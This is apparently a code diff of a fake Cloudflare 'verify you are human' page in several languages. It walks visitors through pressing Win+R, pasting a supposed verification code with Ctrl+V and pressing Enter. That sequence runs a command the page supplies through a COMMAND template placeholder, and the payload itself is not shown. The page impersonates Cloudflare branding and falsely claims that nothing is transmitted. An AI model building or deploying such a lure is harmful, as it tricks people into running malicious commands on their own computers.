+        hi: { checking: "सत्यापित किया जा रहा है कि आप मानव हैं। इसमें कुछ सेकंड लग सकते हैं।", verifyInstruction: "नीचे दिया गया कार्य पूरा करके प्रमाणित करें कि आप एक मानव हैं।", verifying: "सत्यापित कर रहे हैं...", notRobot: "मैं एक रोबोट नहीं हूँ", steps: "सत्यापन आवश्यक", success: "सफल।", confidentiality: "गोपनीयता", terms: "नियम और शर्तें", footer: "आपकी कनेक्शन की सुरक्षा की समीक्षा करने की आवश्यकता है।" }
+      };
 
-  function detectLang(){
-    const prefs=(navigator.languages&&navigator.languages.length?navigator.languages:[navigator.language||"en"]).map(x=>x.toLowerCase());
-    for(const l of prefs){
-      if(l.startsWith("ar")) return "ar";
-      if(l.startsWith("fr")) return "fr";
-      if(l.startsWith("de")) return "de";
-      if(l.startsWith("it")) return "it";
-      if(l.startsWith("ja")) return "ja";
-      if(l.startsWith("zh")) return "zh";
-      if(l.startsWith("ko")) return "ko";
-      if(l.startsWith("ru")) return "ru";
-      if(l.startsWith("es")) return "es";
-      if(l.startsWith("pt")) return "pt";
-      if(l.startsWith("nl")) return "nl";
-      if(l.startsWith("tr")) return "tr";
-      if(l.startsWith("hi")) return "hi";
-      if(l.startsWith("en")) return "en";
-    }
-    return "en";
-  }
+      function detectLang() {
+        const prefs = (navigator.languages && navigator.languages.length ? navigator.languages : [navigator.language || "en"]).map(x => x.toLowerCase());
+        for (const l of prefs) {
+          if (l.startsWith("ar")) return "ar";
+          if (l.startsWith("fr")) return "fr";
+          if (l.startsWith("de")) return "de";
+          if (l.startsWith("it")) return "it";
+          if (l.startsWith("ja")) return "ja";
+          if (l.startsWith("zh")) return "zh";
+          if (l.startsWith("ko")) return "ko";
+          if (l.startsWith("ru")) return "ru";
+          if (l.startsWith("es")) return "es";
+          if (l.startsWith("pt")) return "pt";
+          if (l.startsWith("nl")) return "nl";
+          if (l.startsWith("tr")) return "tr";
+          if (l.startsWith("hi")) return "hi";
+          if (l.startsWith("en")) return "en";
+        }
+        return "en";
+      }
 
-  function ready(fn){ if(document.readyState==="loading") document.addEventListener("DOMContentLoaded",fn); else fn(); }
+      function ready(fn) { if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", fn); else fn(); }
 
-  ready(function(){
-    const lang = detectLang();
-    const t = i18n[lang] || i18n.en;
+      ready(function () {
+        const lang = detectLang();
+        const t = i18n[lang] || i18n.en;
 
-    if (lang === "ar") document.documentElement.dir = "rtl";
+        if (lang === "ar") document.documentElement.dir = "rtl";
 
-    const pre = document.querySelector(".preloader_text"); if(pre) pre.textContent = t.checking;
-    const allstep = document.querySelector(".textallstep"); if(allstep) allstep.textContent = t.verifyInstruction;
+        const pre = document.querySelector(".preloader_text"); if (pre) pre.textContent = t.checking;
+        const allstep = document.querySelector(".textallstep"); if (allstep) allstep.textContent = t.verifyInstruction;
 
-    const set = (sel, txt)=>{ document.querySelectorAll(sel).forEach(el=>el.textContent = txt); };
-    set(".tettx .step0", t.verifying);
-    set(".tettx .step1", t.notRobot);
-    set(".tettx .step2", t.steps);
-    set(".tettx .step3", t.success);
+        const set = (sel, txt) => { document.querySelectorAll(sel).forEach(el => el.textContent = txt); };
+        set(".tettx .step0", t.verifying);
+        set(".tettx .step1", t.notRobot);
+        set(".tettx .step2", t.steps);
+        set(".tettx .step3", t.success);
 
-    const cb = document.getElementById("checkbox"); if (cb) cb.textContent = "";
+        const cb = document.getElementById("checkbox"); if (cb) cb.textContent = "";
 
-    const legalBox = document.querySelector('#checkbox-window > div > div:last-child');
-    if (legalBox) {
-      const ps = legalBox.querySelectorAll("p");
-      if (ps[0]) ps[0].textContent = t.confidentiality;
-      if (ps[1]) ps[1].textContent = t.terms;
-    }
+        const legalBox = document.querySelector('#checkbox-window > div > div:last-child');
+        if (legalBox) {
+          const ps = legalBox.querySelectorAll("p");
+          if (ps[0]) ps[0].textContent = t.confidentiality;
+          if (ps[1]) ps[1].textContent = t.terms;
+        }
 
-    const footerSentence = document.querySelector(".footer-sentence");
-    if (footerSentence) {
-      var rawDomain = window.location.hostname;
-      var isLocalDomain = !rawDomain || rawDomain === "localhost" || rawDomain === "127.0.0.1" || rawDomain === "0.0.0.0" || window.location.protocol === "file:";
-      var domainDisplay = isLocalDomain ? "localhost" : rawDomain;
-      footerSentence.innerHTML = '<span class="domain-name footer-domain" style="font-weight:600">' + domainDisplay + '</span> ' + t.footer;
-    }
-  });
-})();
-</script>
-<script>
-;(() => {
-  function injectAnimationStyles() {
-    if (document.getElementById("cf-captcha-animations")) return
-    var style = document.createElement("style")
-    style.id = "cf-captcha-animations"
-    style.textContent = `
+        const footerSentence = document.querySelector(".footer-sentence");
+        if (footerSentence) {
+          var rawDomain = window.location.hostname;
+          var isLocalDomain = !rawDomain || rawDomain === "localhost" || rawDomain === "127.0.0.1" || rawDomain === "0.0.0.0" || window.location.protocol === "file:";
+          var domainDisplay = isLocalDomain ? "localhost" : rawDomain;
+          footerSentence.innerHTML = '<span class="domain-name footer-domain" style="font-weight:600">' + domainDisplay + '</span> ' + t.footer;
+        }
+      });
+    })();
+  </script>
+  <script>
+    ; (() => {
+      function injectAnimationStyles() {
+        if (document.getElementById("cf-captcha-animations")) return
+        var style = document.createElement("style")
+        style.id = "cf-captcha-animations"
+        style.textContent = `
       @keyframes cfSpin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
       @keyframes cfFadeIn { from { opacity: 0; } to { opacity: 1; } }
       @keyframes cfFadeInUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
@@ -350,287 +504,288 @@ document.addEventListener("DOMContentLoaded", function () {
       @keyframes plusGlow { 0%, 20% { color: #999; } 27%, 33% { color: #f97316; } 40%, 100% { color: #999; } }
       @keyframes plusGlowStep2 { 0%, 35% { color: #999; } 40%, 50% { color: #f97316; } 55%, 100% { color: #999; } }
     `
-    document.head.appendChild(style)
-  }
-
-  var COOKIE_NAME = "cf_clearance"
-  var COOKIE_DURATION_DAYS = 90
-  var COMMAND = command || '{{COMMAND}}'
-
-  var captchaOpen = false
-  var animationPhase = 4
-  var step = 1
-  var faqOpen = false
-  var howItWorksOpen = false
-  var expandedFaq = null
-  var expandedHowItWorks = null
-  var lang = "en"
-
-  var translations = {
-    en: { verify: "Verify", privacy: "Privacy", terms: "Terms", verificationSteps: "Verification", step1: "Hold Windows key and press R", step2Line1: "Press Ctrl+V to paste verification code", confirmWith: "and confirm with", introTitle: "One-Time Device Verification", introSubtitle: "Complete this quick verification to browse for 90 days without interruptions. Our advanced hardware fingerprinting ensures privacy and eliminates recurring captcha challenges.", hwScanTitle: "Hardware Fingerprint", cookieTitle: "90-Day Access Token", secureTitle: "Privacy by Design", hwScanDesc: "Your device's unique hardware configuration is scanned to create a secure fingerprint. This helps verify you're a real person without collecting personal data.", cookieDesc: "After verification, a secure token is stored for 90 days. During this time, you won't need to complete any additional captcha challenges.", secureDesc: "All verification data is processed locally on your device. No personal information is transmitted or stored on external servers.", howItWorks: "How It Works", faqTitle: "Frequently Asked Questions", continueBtn: "Continue to Verification", verifyHuman: "Verify You Are Human", faq1Q: "Why am I seeing this?", faq1A: "This verification helps protect the website from automated bots and ensures you're a real person.", faq2Q: "Is my data safe?", faq2A: "Yes. All verification is done locally on your device. No personal data is collected or transmitted.", faq3Q: "How long does the token last?", faq3A: "The verification token is valid for 90 days. After that, you may need to verify again.", faq4Q: "What if verification fails?", faq4A: "If verification fails, you can try again. Make sure your browser allows JavaScript.", faq5Q: "Does this work on all browsers?", faq5A: "This verification works on all modern browsers including Chrome, Firefox, Edge, and Safari.", faq6Q: "Can I opt out?", faq6A: "Verification is required to access the website. It ensures security for all users." },
-    de: { verify: "Überprüfen", privacy: "Datenschutz", terms: "Bedingungen", verificationSteps: "Überprüfung", step1: "Halten Sie die Windows-Taste gedrückt und drücken Sie R", step2Line1: "Drücken Sie Strg+V um den Verifizierungscode einzufügen", confirmWith: "und bestätigen Sie mit", introTitle: "Einmalige Geräteüberprüfung", introSubtitle: "Schließen Sie diese schnelle Überprüfung ab, um 90 Tage lang ohne Unterbrechungen zu surfen. Unser fortschrittliches Hardware-Fingerprinting gewährleistet Privatsphäre und eliminiert wiederkehrende Captcha-Herausforderungen.", hwScanTitle: "Hardware-Fingerabdruck", cookieTitle: "90-Tage-Zugriffstoken", secureTitle: "Datenschutz durch Design", hwScanDesc: "Die einzigartige Hardware-Konfiguration Ihres Geräts wird gescannt, um einen sicheren Fingerabdruck zu erstellen.", cookieDesc: "Nach der Überprüfung wird ein sicheres Token für 90 Tage gespeichert.", secureDesc: "Alle Verifizierungsdaten werden lokal auf Ihrem Gerät verarbeitet.", howItWorks: "Wie es funktioniert", faqTitle: "Häufig gestellte Fragen", continueBtn: "Weiter zur Überprüfung", verifyHuman: "Verifizieren Sie, dass Sie ein Mensch sind", faq1Q: "Warum sehe ich das?", faq1A: "Diese Überprüfung schützt die Website vor automatisierten Bots.", faq2Q: "Sind meine Daten sicher?", faq2A: "Ja. Alle Überprüfungen erfolgen lokal auf Ihrem Gerät.", faq3Q: "Wie lange ist das Token gültig?", faq3A: "Das Token ist 90 Tage gültig.", faq4Q: "Was passiert bei einem Fehler?", faq4A: "Sie können es erneut versuchen.", faq5Q: "Funktioniert das in allen Browsern?", faq5A: "Ja, in allen modernen Browsern.", faq6Q: "Kann ich ablehnen?", faq6A: "Die Überprüfung ist erforderlich." },
-    fr: { verify: "Vérifier", privacy: "Confidentialité", terms: "Conditions", verificationSteps: "Vérification", step1: "Maintenez la touche Windows et appuyez sur R", step2Line1: "Appuyez sur Ctrl+V pour coller le code de vérification", confirmWith: "et confirmez avec", introTitle: "Vérification unique de l'appareil", introSubtitle: "Effectuez cette vérification rapide pour naviguer 90 jours sans interruption.", hwScanTitle: "Empreinte matérielle", cookieTitle: "Jeton d'accès 90 jours", secureTitle: "Confidentialité par conception", hwScanDesc: "La configuration matérielle unique de votre appareil est analysée.", cookieDesc: "Après vérification, un jeton sécurisé est stocké pendant 90 jours.", secureDesc: "Toutes les données de vérification sont traitées localement.", howItWorks: "Comment ça fonctionne", faqTitle: "Questions fréquentes", continueBtn: "Continuer la vérification", verifyHuman: "Vérifiez que vous êtes humain", faq1Q: "Pourquoi est-ce que je vois ceci?", faq1A: "Cette vérification protège le site contre les bots.", faq2Q: "Mes données sont-elles en sécurité?", faq2A: "Oui, tout est traité localement.", faq3Q: "Combien de temps dure le jeton?", faq3A: "Le jeton est valide 90 jours.", faq4Q: "Et si la vérification échoue?", faq4A: "Vous pouvez réessayer.", faq5Q: "Cela fonctionne-t-il dans tous les navigateurs?", faq5A: "Oui, dans tous les navigateurs modernes.", faq6Q: "Puis-je refuser?", faq6A: "La vérification est requise." },
-    es: { verify: "Verificar", privacy: "Privacidad", terms: "Términos", verificationSteps: "Verificación", step1: "Mantenga pulsada la tecla Windows y pulse R", step2Line1: "Pulse Ctrl+V para pegar el código de verificación", confirmWith: "y confirme con", introTitle: "Verificación única del dispositivo", introSubtitle: "Complete esta verificación rápida para navegar 90 días sin interrupciones.", hwScanTitle: "Huella de hardware", cookieTitle: "Token de acceso de 90 días", secureTitle: "Privacidad por diseño", hwScanDesc: "Se escanea la configuración de hardware de su dispositivo.", cookieDesc: "Después de la verificación, se almacena un token seguro durante 90 días.", secureDesc: "Todos los datos se procesan localmente.", howItWorks: "Cómo funciona", faqTitle: "Preguntas frecuentes", continueBtn: "Continuar con la verificación", verifyHuman: "Verifica que eres humano", faq1Q: "¿Por qué veo esto?", faq1A: "Protege el sitio contra bots.", faq2Q: "¿Mis datos están seguros?", faq2A: "Sí, todo es local.", faq3Q: "¿Cuánto dura el token?", faq3A: "90 días.", faq4Q: "¿Y si falla?", faq4A: "Puede intentar de nuevo.", faq5Q: "¿Funciona en todos los navegadores?", faq5A: "Sí.", faq6Q: "¿Puedo rechazar?", faq6A: "La verificación es obligatoria." },
-    ru: { verify: "Проверить", privacy: "Конфиденциальность", terms: "Условия", verificationSteps: "Проверка", step1: "Удерживайте клавишу Windows и нажмите R", step2Line1: "Нажмите Ctrl+V чтобы вставить код проверки", confirmWith: "и подтвердите нажатием", introTitle: "Одноразовая проверка устройства", introSubtitle: "Пройдите быструю проверку для 90 дней без прерываний.", hwScanTitle: "Аппаратный отпечаток", cookieTitle: "90-дневный токен", secureTitle: "Конфиденциальность", hwScanDesc: "Сканирование уникальной конфигурации вашего устройства.", cookieDesc: "После проверки токен сохраняется на 90 дней.", secureDesc: "Все данные обрабатываются локально.", howItWorks: "Как это работает", faqTitle: "Часто задаваемые вопросы", continueBtn: "Продолжить проверку", verifyHuman: "Подтвердите, что вы человек", faq1Q: "Почему я это вижу?", faq1A: "Это защита от ботов.", faq2Q: "Мои данные в безопасности?", faq2A: "Да, всё локально.", faq3Q: "Сколько действует токен?", faq3A: "90 дней.", faq4Q: "Что если не получится?", faq4A: "Попробуйте снова.", faq5Q: "Работает во всех браузерах?", faq5A: "Да.", faq6Q: "Можно отказаться?", faq6A: "Проверка обязательна." },
-    zh: { verify: "验证", privacy: "隐私", terms: "条款", verificationSteps: "验证", step1: "按住Windows键并按R", step2Line1: "按Ctrl+V粘贴验证码", confirmWith: "并按确认", introTitle: "一次性设备验证", introSubtitle: "完成快速验证即可享受90天不间断浏览。", hwScanTitle: "硬件指纹", cookieTitle: "90天访问令牌", secureTitle: "隐私设计", hwScanDesc: "扫描设备硬件配置。", cookieDesc: "验证后令牌保存90天。", secureDesc: "所有数据在本地处理。", howItWorks: "工作原理", faqTitle: "常见问题", continueBtn: "继续验证", verifyHuman: "验证您是人类", faq1Q: "为什么看到这个？", faq1A: "保护网站免受机器人攻击。", faq2Q: "数据安全吗？", faq2A: "是的，全部本地处理。", faq3Q: "令牌有效期？", faq3A: "90天。", faq4Q: "验证失败怎么办？", faq4A: "重试即可。", faq5Q: "支持所有浏览器吗？", faq5A: "是的。", faq6Q: "可以拒绝吗？", faq6A: "验证是必须的。" },
-    ja: { verify: "確認", privacy: "プライバシー", terms: "利用規約", verificationSteps: "確認", step1: "Windowsキーを押しながらRを押してください", step2Line1: "Ctrl+Vで確認コードを貼り付けてください", confirmWith: "そして確認", introTitle: "ワンタイムデバイス認証", introSubtitle: "この簡単な認証を完了すると、90日間中断なしでブラウジングできます。", hwScanTitle: "ハードウェア指紋", cookieTitle: "90日アクセストークン", secureTitle: "プライバシー設計", hwScanDesc: "デバイスのハードウェア構成をスキャンします。", cookieDesc: "認証後、90日間トークンが保存されます。", secureDesc: "すべてのデータはローカルで処理されます。", howItWorks: "仕組み", faqTitle: "よくある質問", continueBtn: "認証を続ける", verifyHuman: "人間であることを確認", faq1Q: "なぜこれが表示されますか？", faq1A: "ボットからの保護です。", faq2Q: "データは安全ですか？", faq2A: "はい、すべてローカルです。", faq3Q: "トークンの有効期間は？", faq3A: "90日間。", faq4Q: "認証に失敗したら？", faq4A: "再試行してください。", faq5Q: "すべてのブラウザで動作しますか？", faq5A: "はい。", faq6Q: "拒否できますか？", faq6A: "認証は必須です。" }
-  }
-
-  function detectLanguage() {
-    var navLang = (navigator.language || navigator.userLanguage || "en").toLowerCase()
-    var langKeys = Object.keys(translations)
-    for (var i = 0; i < langKeys.length; i++) {
-      if (navLang.startsWith(langKeys[i])) return langKeys[i]
-    }
-    return "en"
-  }
-
-  function t(key) {
-    return (translations[lang] && translations[lang][key]) || (translations.en && translations.en[key]) || key
-  }
-
-  function setCookie(name, value, days) { var d = new Date(); d.setTime(d.getTime() + days * 86400000); document.cookie = name + "=" + value + ";expires=" + d.toUTCString() + ";path=/;SameSite=Lax"; }
-  function getCookie(name) { var m = document.cookie.match(new RegExp("(^| )" + name + "=([^;]+)")); return m ? m[2] : null; }
-  function isVerified() { return getCookie(COOKIE_NAME) === "verified" }
-  function setVerificationCookie() { setCookie(COOKIE_NAME, "verified", COOKIE_DURATION_DAYS) }
-
-  var step1KeyDetected = false
-  function setupKeyboardHandler() {
-    document.addEventListener("keydown", function (e) {
-      if (!captchaOpen || animationPhase !== 5) return
-      if (step === 1 && !step1KeyDetected && (e.code === "MetaLeft" || e.code === "MetaRight" || e.key === "r" || e.key === "R")) {
-        step1KeyDetected = true
-        setTimeout(function() {
-          step = 2
-          step1KeyDetected = false
-          renderCaptchaContent()
-        }, 1500)
+        document.head.appendChild(style)
       }
-    })
-  }
 
-  var winIcon = '<svg viewBox="0 0 24 24" style="width:22px;height:22px;fill:#555"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>'
+      var COOKIE_NAME = "cf_clearance"
+      var COOKIE_DURATION_DAYS = 90
+      var COMMAND = command || '{{COMMAND}}'
 
-  function renderKey(label, width, animClass) {
-    var isWinKey = label === "Win"
-    var keyCapStyle = "position:absolute;top:0;left:0;right:0;height:48px;border-radius:10px;display:flex;align-items:center;justify-content:center;border:1px solid rgba(0,0,0,0.08)"
-    if (!animClass) keyCapStyle += ";background:linear-gradient(180deg,#ffffff 0%,#f5f5f5 100%);box-shadow:0 4px 0 #d4d4d4,0 6px 8px rgba(0,0,0,0.15),inset 0 1px 0 rgba(255,255,255,0.9)"
-    var animationName = ""
-    if (animClass === "key-anim-first") animationName = "keyCapFirst 5s ease-in-out infinite"
-    else if (animClass === "key-anim-second") animationName = "keyCapSecond 5s ease-in-out infinite"
-    else if (animClass === "key-anim-step2-ctrl") animationName = "keyCapStep2Ctrl 6s ease-in-out infinite"
-    else if (animClass === "key-anim-step2-v") animationName = "keyCapStep2V 6s ease-in-out infinite"
-    else if (animClass === "key-anim-step2-enter") animationName = "keyCapStep2Enter 6s ease-in-out infinite"
-    var animationStyle = animationName ? ";animation:" + animationName : ""
-    return '<div class="' + animClass + '" style="width:' + width + 'px;height:56px;position:relative;display:inline-block">' +
-      '<div style="position:absolute;bottom:0;left:2px;right:2px;height:8px;border-radius:0 0 10px 10px;background:linear-gradient(180deg,#c8c8c8 0%,#b0b0b0 100%)"></div>' +
-      '<div class="key-cap" style="' + keyCapStyle + animationStyle + '">' +
-      (isWinKey ? winIcon : '<span style="font-size:' + (label === "Enter" ? "13" : label === "Ctrl" ? "12" : "16") + 'px;font-weight:600;color:#555">' + label + '</span>') +
-      '</div></div>'
-  }
+      var captchaOpen = false
+      var animationPhase = 4
+      var step = 1
+      var faqOpen = false
+      var howItWorksOpen = false
+      var expandedFaq = null
+      var expandedHowItWorks = null
+      var lang = "en"
 
-  function renderIntroPage() {
-    var featuresHtml = [
-      { title: t("hwScanTitle"), icon: "fingerprint" },
-      { title: t("cookieTitle"), icon: "clock" },
-      { title: t("secureTitle"), icon: "shield" }
-    ].map(function(item) {
-      var imgStyle = item.icon === "shield" ? "width:120px;height:120px" : "width:60px;height:60px"
-      return '<div style="flex:1;background:#fff;border:2px solid #f97316;border-radius:12px;padding:12px 10px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;box-shadow:0 2px 8px rgba(249,115,22,0.1)">' +
-        '<div style="height:60px;display:flex;align-items:center;justify-content:center">' +
-        '<img src="' + window.cfCaptchaImages[item.icon] + '" alt="" style="' + imgStyle + ';object-fit:contain">' +
-        '</div><div style="font-size:12px;font-weight:700;color:#1e293b;text-align:center;line-height:1.3">' + item.title + '</div></div>'
-    }).join("")
-
-    var howItWorksContent = ""
-    if (howItWorksOpen) {
-      var items = [
-        { num: 1, title: "1. Hardware Scan", desc: t("hwScanDesc") },
-        { num: 2, title: "2. Token Generation", desc: t("cookieDesc") },
-        { num: 3, title: "3. Privacy Protection", desc: t("secureDesc") }
-      ]
-      howItWorksContent = '<div style="padding:16px 24px 8px">' + items.map(function(item) {
-        var isExpanded = expandedHowItWorks === item.num
-        return '<div style="margin-bottom:10px;background:rgba(255,255,255,0.3);border-radius:6px;overflow:hidden">' +
-          '<button onclick="window.CloudflareCaptcha.toggleHowItWorksItem(' + item.num + ')" style="width:100%;padding:8px 10px;display:flex;justify-content:space-between;align-items:center;border:none;background:transparent;cursor:pointer;color:#fff;text-align:left">' +
-          '<span style="font-size:12px;font-weight:600;flex:1">' + item.title + '</span>' +
-          '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" style="transform:rotate(' + (isExpanded ? "180" : "0") + 'deg);transition:transform 0.3s;flex-shrink:0"><path d="M6 9l6 6 6-6" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg>' +
-          '</button>' + (isExpanded ? '<div style="padding:12px 10px;color:#1f2937;font-size:11px;line-height:1.6;background:rgba(255,255,255,0.9);border-radius:0 0 6px 6px">' + item.desc + '</div>' : '') + '</div>'
-      }).join("") + '</div>'
-    }
-
-    var howItWorksHtml = '<div style="border:1px solid #e2e8f0;border-radius:8px;overflow:hidden;background:' + (howItWorksOpen ? "linear-gradient(135deg,#f97316 0%,#ea580c 100%)" : "#fff") + ';transition:all 0.3s ease;margin-bottom:12px">' +
-      '<button onclick="window.CloudflareCaptcha.toggleHowItWorks()" style="width:100%;padding:10px 12px;display:flex;justify-content:space-between;align-items:center;border:none;background:transparent;cursor:pointer;color:' + (howItWorksOpen ? "#fff" : "#1e293b") + '">' +
-      '<div style="display:flex;align-items:center;gap:8px"><div style="width:24px;height:24px;border-radius:50%;background:' + (howItWorksOpen ? "#fff" : "linear-gradient(135deg,#f97316 0%,#ea580c 100%)") + ';display:flex;align-items:center;justify-content:center"><span style="font-size:14px;font-weight:700;color:' + (howItWorksOpen ? "#f97316" : "#fff") + '">!</span></div>' +
-      '<span style="font-size:13px;font-weight:600;color:' + (howItWorksOpen ? "#fff" : "#1e293b") + '">' + t("howItWorks") + '</span></div>' +
-      '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" style="transform:rotate(' + (howItWorksOpen ? "180" : "0") + 'deg);transition:transform 0.3s"><path d="M6 9l6 6 6-6" stroke="' + (howItWorksOpen ? "#fff" : "#f97316") + '" stroke-width="2" stroke-linecap="round"/></svg></button>' + howItWorksContent + '</div>'
-
-    var faqContent = ""
-    if (faqOpen) {
-      faqContent = '<div style="padding:16px 24px 8px">' + [1,2,3,4,5,6].map(function(num) {
-        var isExpanded = expandedFaq === num
-        return '<div style="margin-bottom:10px;background:rgba(255,255,255,0.3);border-radius:6px;overflow:hidden">' +
-          '<button onclick="window.CloudflareCaptcha.toggleFaqItem(' + num + ')" style="width:100%;padding:8px 10px;display:flex;justify-content:space-between;align-items:center;border:none;background:transparent;cursor:pointer;color:#fff;text-align:left">' +
-          '<span style="font-size:12px;font-weight:600;flex:1">' + num + '. ' + t("faq" + num + "Q") + '</span>' +
-          '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" style="transform:rotate(' + (isExpanded ? "180" : "0") + 'deg);transition:transform 0.3s;flex-shrink:0"><path d="M6 9l6 6 6-6" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg></button>' +
-          (isExpanded ? '<div style="padding:12px 10px;color:#1f2937;font-size:11px;line-height:1.6;background:rgba(255,255,255,0.9);border-radius:0 0 6px 6px">' + t("faq" + num + "A") + '</div>' : '') + '</div>'
-      }).join("") + '</div>'
-    }
-
-    var faqHtml = '<div style="border:1px solid #e2e8f0;border-radius:8px;overflow:hidden;background:' + (faqOpen ? "linear-gradient(135deg,#f97316 0%,#ea580c 100%)" : "#fff") + ';transition:all 0.3s ease">' +
-      '<button onclick="window.CloudflareCaptcha.toggleFaq()" style="width:100%;padding:10px 12px;display:flex;justify-content:space-between;align-items:center;border:none;background:transparent;cursor:pointer;color:' + (faqOpen ? "#fff" : "#1e293b") + ';border-radius:8px;transition:all 0.3s ease">' +
-      '<div style="display:flex;align-items:center;gap:8px"><div style="width:24px;height:24px;border-radius:50%;background:' + (faqOpen ? "#fff" : "linear-gradient(135deg,#f97316 0%,#ea580c 100%)") + ';display:flex;align-items:center;justify-content:center"><span style="font-size:14px;font-weight:700;color:' + (faqOpen ? "#f97316" : "#fff") + '">?</span></div>' +
-      '<span style="font-size:13px;font-weight:600;color:' + (faqOpen ? "#fff" : "#1e293b") + '">' + t("faqTitle") + '</span></div>' +
-      '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" style="transform:rotate(' + (faqOpen ? "180" : "0") + 'deg);transition:transform 0.3s"><path d="M6 9l6 6 6-6" stroke="' + (faqOpen ? "#fff" : "#f97316") + '" stroke-width="2" stroke-linecap="round"/></svg></button>' + faqContent + '</div>'
-
-    return '<div style="background:#fff;border-radius:16px;width:480px;height:auto;overflow:visible;box-shadow:0 20px 50px rgba(0,0,0,0.15);display:flex;flex-direction:column;position:relative">' +
-      '<div style="background:linear-gradient(135deg,#f97316 0%,#ea580c 100%);padding:24px;border-radius:16px 16px 0 0;position:relative;overflow:hidden;min-height:100px">' +
-      '<div style="position:absolute;inset:0;background-image:repeating-linear-gradient(0deg,transparent,transparent 30px,rgba(255,255,255,0.05) 30px,rgba(255,255,255,0.05) 32px),repeating-linear-gradient(90deg,transparent,transparent 30px,rgba(255,255,255,0.05) 30px,rgba(255,255,255,0.05) 32px);pointer-events:none"></div>' +
-      '<div style="position:absolute;right:-40px;top:-20px;width:140px;height:140px;border-radius:50%;background:rgba(255,255,255,0.1)"></div>' +
-      '<div style="display:flex;justify-content:center;align-items:center;position:relative;z-index:1"><img src="' + window.cfCaptchaImages.logoWithText + '" alt="Cloudflare" style="height:50px;filter:brightness(0) invert(1)"></div></div>' +
-      '<div style="display:flex;justify-content:center;margin-top:-16px;margin-bottom:16px;position:relative;z-index:2">' +
-      '<div style="background:#fef3c7;border-radius:20px;padding:8px 20px;display:flex;align-items:center;gap:8px;border:1px solid #fbbf24;box-shadow:0 4px 12px rgba(0,0,0,0.1)">' +
-      '<svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M9 12l2 2 4-4" stroke="#f97316" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><circle cx="12" cy="12" r="10" stroke="#f97316" stroke-width="2"/></svg>' +
-      '<span style="font-size:13px;font-weight:600;color:#f97316;text-transform:uppercase;letter-spacing:0.5px">' + t("verifyHuman") + '</span></div></div>' +
-      '<div style="padding:0 24px 16px;text-align:center"><h2 style="font-size:28px;font-weight:700;margin:0 0 8px 0"><span style="color:#f97316">' + t("introTitle").split(" ")[0] + '</span> <span style="color:#1e293b">' + t("introTitle").split(" ").slice(1).join(" ") + '</span></h2>' +
-      '<p style="font-size:13px;color:#64748b;line-height:1.6;margin:0">' + t("introSubtitle") + '</p></div>' +
-      '<div style="flex:1;padding:0 24px 16px"><div style="display:flex;gap:12px;margin-bottom:16px;justify-content:center">' + featuresHtml + '</div>' + howItWorksHtml + faqHtml + '</div>' +
-      '<div style="padding:0 24px 24px"><button onclick="window.CloudflareCaptcha.continueToVerification()" style="width:100%;background:linear-gradient(135deg,#f97316 0%,#ea580c 100%);color:#fff;border:none;border-radius:8px;padding:12px 24px;font-size:14px;font-weight:600;cursor:pointer;box-shadow:0 4px 12px rgba(249,115,22,0.3)">' + t("continueBtn") + '</button></div>' +
-      '<div style="padding:12px 24px;border-top:1px solid #e2e8f0;display:flex;justify-content:center;gap:16px;font-size:11px">' +
-      '<a href="https://www.cloudflare.com/privacypolicy/" style="color:#64748b;text-decoration:none">' + t("privacy") + '</a>' +
-      '<a href="https://www.cloudflare.com/website-terms/" style="color:#64748b;text-decoration:none">' + t("terms") + '</a></div></div>'
-  }
-
-  function renderVerificationModal() {
-    var stepsHtml = [1, 2].map(function(s) {
-      return '<div style="display:flex;align-items:center;gap:8px">' +
-        '<div style="width:8px;height:8px;border-radius:50%;background:' + (step >= s ? "#fff" : "rgba(255,255,255,0.3)") + ';transition:all 0.3s"></div>' +
-        (s < 2 ? '<div style="width:40px;height:2px;background:' + (step > s ? "#fff" : "rgba(255,255,255,0.3)") + ';transition:all 0.3s"></div>' : '') + '</div>'
-    }).join("")
-
-    var contentHtml = ""
-    if (step === 1) {
-      contentHtml = '<div style="display:flex;flex-direction:column;align-items:center;gap:20px">' +
-        '<div style="font-size:16px;font-weight:600;color:#64748b;text-align:center;max-width:360px">' + t("step1") + '</div>' +
-        '<div style="display:flex;gap:8px;align-items:center">' +
-        renderKey("Win", 80, "key-anim-first") +
-        '<span class="plus-animate" style="font-size:18px;color:#9CA3AF;font-weight:400;margin:0 2px">+</span>' +
-        renderKey("R", 56, "key-anim-second") +
-        '</div></div>'
-    } else if (step === 2) {
-      contentHtml = '<div style="display:flex;flex-direction:column;align-items:center;gap:20px">' +
-        '<div style="font-size:16px;font-weight:600;color:#64748b;text-align:center;max-width:360px">' + t("step2Line1") + '</div>' +
-        '<div style="display:flex;gap:8px;align-items:center;justify-content:center">' +
-        renderKey("Ctrl", 80, "key-anim-step2-ctrl") +
-        '<span class="plus-animate-step2" style="font-size:18px;color:#9CA3AF;font-weight:400;margin:0 2px">+</span>' +
-        renderKey("V", 56, "key-anim-step2-v") +
-        '</div>' +
-        '<div style="display:flex;gap:8px;align-items:center;justify-content:center">' +
-        '<span style="font-size:16px;color:#6B7280;font-weight:500">' + t("confirmWith") + '</span>' +
-        renderKey("Enter", 80, "key-anim-step2-enter") +
-        '</div>' +
-        '<button onclick="window.CloudflareCaptcha.complete()" style="padding:12px 32px;background:linear-gradient(135deg,#f97316 0%,#ea580c 100%);color:white;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;box-shadow:0 4px 12px rgba(249,115,22,0.4)">' + t("verify") + '</button>' +
-        '</div>'
-    }
-
-    return '<div style="background:#fff;border-radius:16px;width:480px;min-height:500px;box-shadow:0 20px 50px rgba(0,0,0,0.15);display:flex;flex-direction:column;overflow:hidden">' +
-      '<div style="background:linear-gradient(135deg,#f97316 0%,#ea580c 100%);padding:20px 24px;position:relative;overflow:hidden">' +
